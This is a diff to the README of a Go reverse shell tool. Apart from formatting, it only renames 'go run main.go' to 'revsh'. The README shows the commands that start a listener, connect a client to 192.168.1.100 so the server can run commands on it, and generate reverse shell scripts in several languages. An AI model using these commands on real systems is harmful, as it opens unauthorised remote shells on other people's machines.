@@ -1,4 +1,3 @@
-
 # RevSh - Reverse Shell
 
 RevSh is a simple reverse shell tool written in Go. It allows you to establish a reverse shell connection between a client and a server, enabling the server to execute commands on the client system. This project also includes functionality to generate reverse shell scripts in various programming languages.
@@ -19,6 +18,7 @@ RevSh is a simple reverse shell tool written in Go. It allows you to establish a
 ### Running the Reverse Shell
 
 You can run RevSh in two modes:
+
 1. **Server Mode**: The server listens for incoming connections from a client.
 2. **Client Mode**: The client connects to a server and waits for commands.
 
@@ -37,7 +37,7 @@ You can run RevSh in two modes:
 To start the server, listening for reverse shell connections on port 9999:
 
 ```bash
-go run main.go -l -p 9999
+revsh -l -p 9999
 ```
 
 #### 2. Running in Client Mode
@@ -45,7 +45,7 @@ go run main.go -l -p 9999
 To run the client and connect to the server (e.g., 192.168.1.100) on port 9999:
 
 ```bash
-go run main.go -r -h 192.168.1.100 -p 9999
+revsh -r -h 192.168.1.100 -p 9999
 ```
 
 #### 3. Generating Reverse Shell Scripts
@@ -53,10 +53,11 @@ go run main.go -r -h 192.168.1.100 -p 9999
 To generate a reverse shell script in Bash for a target with IP `192.168.1.100` on port `9999`:
 
 ```bash
-go run main.go -g -lang bash -h 192.168.1.100 -p 9999
+revsh -g -lang bash -h 192.168.1.100 -p 9999
 ```
 
 Supported languages for script generation:
+
 - `php`
 - `bash`
 - `python`
@@ -68,7 +69,7 @@ Supported languages for script generation:
 #### Server Side:
 
 ```bash
-$ go run main.go -l -p 9999
+$ revsh -l -p 9999
 Server listening on port 9999...
 Client connected: 192.168.1.101:12345
 Shell> whoami
@@ -81,7 +82,7 @@ file2.txt
 #### Client Side:
 
 ```bash
-$ go run main.go -r -h 192.168.1.100 -p 9999
+$ revsh -r -h 192.168.1.100 -p 9999
 Connected to server 192.168.1.100:9999
 ```
 
